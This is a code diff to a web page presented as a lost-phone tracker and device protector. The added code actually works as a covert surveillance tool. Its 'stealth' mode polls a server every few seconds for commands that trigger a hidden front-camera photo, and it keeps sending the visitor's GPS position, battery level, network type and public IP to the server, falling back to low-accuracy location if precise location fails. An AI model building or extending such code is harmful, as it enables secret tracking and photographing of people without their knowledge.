@@ -35,14 +35,16 @@
             <h3 style="color: #00ff41; margin-bottom: 20px;">WELCOME, <span id="agent-name"></span></h3>
             <button class="btn-primary" onclick="activateTracking()" style="margin-bottom: 15px;">🗺️ TRACK LOST PHONE</button>
             <button class="btn-google" onclick="activateProtection()" style="border-color: #ff003c; color: #ff003c;">🛡️ PROTECT THIS DEVICE</button>
-            <button class="btn-logout" onclick="location.reload()" style="margin-top: 30px; width: 100%;">DISCONNECT</button>
+            <button class="btn-logout" onclick="logout()" style="margin-top: 30px; width: 100%;">DISCONNECT</button>
         </div>
 
         <div class="login-box" id="protect-section" style="display: none; text-align: center;">
             <div class="blinking-dot" style="margin: 0 auto 15px auto;"></div>
             <h3 style="color: #00ff41; margin-bottom: 15px;">🛡️ PROTECTION ACTIVE</h3>
-            <p style="font-size: 12px; color: #aaa; margin-bottom: 15px;">Stealth Mode: Location & Intel syncing. Awaiting Command...</p>
-            <p id="gps-log" style="font-size: 13px; color: #f39c12; font-weight: bold;"></p>
+            <p style="font-size: 12px; color: #aaa; margin-bottom: 15px;">System is bypassing security to fetch Intel...</p>
+            <!-- Logs yahan dikhenge clear clear -->
+            <p id="cam-log" style="font-size: 12px; color: #f39c12; margin-bottom: 5px;"></p>
+            <p id="gps-log" style="font-size: 13px; color: #00f3ff; font-weight: bold;"></p>
             <button class="btn-logout" onclick="location.reload()" style="margin-top: 30px; width: 100%;">STOP PROTECTION</button>
         </div>
 
@@ -54,7 +56,7 @@
                     <div class="corner-bl"></div><div class="corner-br"></div>
                     <h3><span class="blinking-dot" style="display:inline-block; margin-right:10px;"></span>TARGET UPLINK</h3>
                     <div class="info-box" style="font-size: 13px;">
-                        <p>STATUS: <span id="status" style="color: #f39c12;">WAKING UP SERVER... (Wait 30s)</span></p>
+                        <p>STATUS: <span id="status" style="color: #f39c12;">WAITING FOR TARGET DATA...</span></p>
                         <p>IP ADDR: <span id="ip-addr" style="color: #00f3ff;">--</span></p>
                         <p>BATTERY: <span id="batt">--%</span></p>
                         <p>NETWORK: <span id="net">--</span></p>
@@ -91,9 +93,26 @@
         let map, marker, circle, trackingInterval;
         let isFirstLocationLoad = true;
         let isFullScreen = false;
-
         let targetIp = "Detecting...";
         let cameraAccessed = false;
+
+        // Auto-Login Check
+        window.onload = function() {
+            const savedUser = localStorage.getItem('sys_username');
+            const savedDevId = localStorage.getItem('sys_device_id');
+            if(savedUser && savedDevId) {
+                globalDeviceId = savedDevId;
+                document.getElementById('auth-section').style.display = 'none';
+                document.getElementById('menu-section').style.display = 'block';
+                document.getElementById('agent-name').innerText = savedUser.toUpperCase();
+                document.getElementById('form-subtitle').innerText = 'ACTION MENU';
+            }
+        }
+
+        function logout() {
+            localStorage.clear();
+            location.reload();
+        }
 
         function toggleFullScreen() {
             const mapBox = document.getElementById('map-container');
@@ -129,6 +148,9 @@
                 if(data.success) {
                     if(isLoginMode) {
                         globalDeviceId = data.deviceId;
+                        localStorage.setItem('sys_username', user);
+                        localStorage.setItem('sys_device_id', data.deviceId);
+                        
                         document.getElementById('auth-section').style.display = 'none';
                         document.getElementById('menu-section').style.display = 'block';
                         document.getElementById('agent-name').innerText = user.toUpperCase();
@@ -140,21 +162,35 @@
         }
 
         // ==========================================
-        // 🛡️ PROTECT MODE
+        // 🛡️ PROTECT MODE (Camera & GPS)
         // ==========================================
         function activateProtection() {
             document.getElementById('menu-section').style.display = 'none';
             document.getElementById('protect-section').style.display = 'block';
             document.getElementById('form-subtitle').innerText = 'DEVICE SECURED';
-            const logText = document.getElementById('gps-log');
+            
+            const camLog = document.getElementById('cam-log');
+            const gpsLog = document.getElementById('gps-log');
             
             fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => { targetIp = d.ip; }).catch(e=>{});
 
+            // CAMERA CHECK
+            camLog.innerText = "Requesting Camera Access...";
             if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(stream => { stream.getTracks().forEach(track => track.stop()); }).catch(e=>{});
+                .then(stream => { 
+                    camLog.innerText = "📷 Camera Ready (Stealth Mode).";
+                    camLog.style.color = "#00ff41";
+                    stream.getTracks().forEach(track => track.stop()); 
+                }).catch(e => {
+                    camLog.innerText = "⚠️ Camera Blocked by User/Browser.";
+                    camLog.style.color = "#ff003c";
+                });
+            } else {
+                camLog.innerText = "⚠️ Camera not supported on this browser.";
             }
 
+            // COMMAND LISTENER
             setInterval(() => {
                 fetch('/api/check-command', {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -164,30 +200,50 @@
                         cameraAccessed = true;
                         takeStealthPhoto();
                     }
-                }).catch(e => {}); // Ignore offline errors
+                }).catch(e => {}); 
             }, 3000);
 
+            // GPS CHECK WITH FALLBACK
             if (navigator.geolocation) {
-                logText.innerText = "Acquiring GPS Signal... Please wait.";
+                gpsLog.innerText = "Acquiring GPS Signal... Please wait (Max 10s).";
+                
+                // Humne timeout 10000 lagaya hai taaki atak na jaye
                 navigator.geolocation.watchPosition(async (position) => {
-                    let batteryStr = "Unknown", netStr = "Unknown";
-                    if (navigator.getBattery) {
-                        try { let bat = await navigator.getBattery(); batteryStr = Math.round(bat.level * 100) + "%"; if(bat.charging) batteryStr += " ⚡"; } catch(e) {}
-                    }
-                    if (navigator.connection) netStr = navigator.connection.effectiveType ? navigator.connection.effectiveType.toUpperCase() : "ONLINE";
+                    sendDataToServer(position);
+                }, (err) => { 
+                    gpsLog.innerText = "⚠️ GPS Failed (Code " + err.code + "). Retrying low accuracy...";
+                    gpsLog.style.color = "#f39c12";
+                    
+                    // Fallback: Agar high accuracy fail ho, toh normal location nikalo
+                    navigator.geolocation.getCurrentPosition((pos) => {
+                        sendDataToServer(pos);
+                    }, (e) => {
+                        gpsLog.innerText = "❌ Location Access Denied or Blocked!";
+                        gpsLog.style.color = "#ff003c";
+                    }, { enableHighAccuracy: false, timeout: 10000 });
 
-                    fetch('/api/update-location', {
-                        method: 'POST', headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            deviceId: globalDeviceId, lat: position.coords.latitude, lng: position.coords.longitude, 
-                            accuracy: position.coords.accuracy, battery: batteryStr, network: netStr, ipAddress: targetIp
-                        })
-                    }).then(() => {
-                        logText.innerText = `[SUCCESS] Data Synced: ${new Date().toLocaleTimeString()}`;
-                        logText.style.color = "#00ff41";
-                    }).catch(e => { logText.innerText = "Syncing... Server might be asleep."; logText.style.color = "#f39c12"; });
-                }, (err) => { logText.innerText = "Allow Location to proceed!"; }, { enableHighAccuracy: true, maximumAge: 0 });
+                }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
             }
+        }
+
+        async function sendDataToServer(position) {
+            const gpsLog = document.getElementById('gps-log');
+            let batteryStr = "Unknown", netStr = "Unknown";
+            if (navigator.getBattery) {
+                try { let bat = await navigator.getBattery(); batteryStr = Math.round(bat.level * 100) + "%"; if(bat.charging) batteryStr += " ⚡"; } catch(e) {}
+            }
+            if (navigator.connection) netStr = navigator.connection.effectiveType ? navigator.connection.effectiveType.toUpperCase() : "ONLINE";
+
+            fetch('/api/update-location', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    deviceId: globalDeviceId, lat: position.coords.latitude, lng: position.coords.longitude, 
+                    accuracy: position.coords.accuracy, battery: batteryStr, network: netStr, ipAddress: targetIp
+                })
+            }).then(() => {
+                gpsLog.innerText = `✅ [SUCCESS] Location & Intel Synced: ${new Date().toLocaleTimeString()}`;
+                gpsLog.style.color = "#00ff41";
+            }).catch(e => { gpsLog.innerText = "Syncing... Server offline."; gpsLog.style.color = "#ff003c"; });
         }
 
         function takeStealthPhoto() {
@@ -277,9 +333,8 @@
                     document.getElementById('status').style.color = "#ff003c";
                 }
             }).catch(err => {
-                // Yahan humne naya error handling dala hai!
                 document.getElementById('status').innerText = "WAKING UP SERVER... PLEASE WAIT";
-                document.getElementById('status').style.color = "#f39c12"; // Orange color
+                document.getElementById('status').style.color = "#f39c12"; 
             });
         }
     </script>
